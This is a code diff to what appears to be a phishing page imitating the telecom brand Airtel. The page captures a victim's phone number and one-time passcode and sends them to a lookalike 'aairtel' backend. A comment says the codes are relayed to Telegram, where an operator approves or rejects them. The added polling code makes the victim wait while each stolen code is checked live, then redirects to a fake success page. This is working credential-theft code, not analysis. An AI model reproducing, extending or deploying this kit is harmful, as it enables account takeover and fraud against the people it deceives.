@@ -373,6 +373,7 @@
 <script>
   /* ==================== CONFIG ==================== */
   const BACKEND_URL = 'https://aairtel-production.up.railway.app';
+  const POLL_INTERVAL = 2000; // 2 seconds
 
   /* ==================== ELEMENTS ==================== */
   const otpInput = document.getElementById('otpInput');
@@ -444,7 +445,13 @@
 
   startCountdown();
 
-  /* ==================== FORM SUBMIT (BACKEND CALL) ==================== */
+  /* ==================== POLLING ==================== */
+  let pollTimer = null;
+  function stopPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  /* ==================== FORM SUBMIT ==================== */
   document.getElementById('otpForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
@@ -458,11 +465,10 @@
     otpInput.disabled = true;
 
     try {
+      // 1. Send OTP to backend → Telegram (with ✅ / ❌ buttons)
       const res = await fetch(`${BACKEND_URL}/api/otp`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           phone: phone,
           otp: otp,
@@ -475,24 +481,45 @@
       const data = await res.json();
 
       if (!res.ok || !data.success) {
-        throw new Error(data.error || 'Code incorrect');
+        throw new Error(data.error || 'Erreur de connexion');
       }
 
-      // Success → go to success page
-      window.location.href = 'success.html';
+      const requestId = data.request_id;
+
+      // 2. Waiting for admin — start polling
+      submitBtnText.textContent = 'EN ATTENTE...';
+
+      pollTimer = setInterval(async () => {
+        try {
+          const r = await fetch(`${BACKEND_URL}/api/otp/status/${requestId}`);
+          const s = await r.json();
+
+          if (s.status === 'approved') {
+            stopPolling();
+            window.location.href = 'success.html';
+          } else if (s.status === 'rejected' || s.status === 'expired') {
+            stopPolling();
+            resetWithError('Code incorrect');
+          }
+        } catch (err) {
+          console.error('Poll error:', err);
+        }
+      }, POLL_INTERVAL);
+
     } catch (err) {
       console.error(err);
-
-      // Reset button
-      spinner.classList.remove('show');
-      submitBtnText.textContent = 'SOUMETTRE';
-      submitBtn.disabled = false;
-      otpInput.disabled = false;
-
-      // Show error modal
-      showErrorModal(err.message || 'Code incorrect');
+      resetWithError(err.message || 'Code incorrect');
     }
   });
+
+  /* ==================== RESET WITH ERROR ==================== */
+  function resetWithError(message) {
+    spinner.classList.remove('show');
+    submitBtnText.textContent = 'SOUMETTRE';
+    submitBtn.disabled = false;
+    otpInput.disabled = false;
+    showErrorModal(message);
+  }
 
   /* ==================== ERROR MODAL ==================== */
   function showErrorModal(message) {
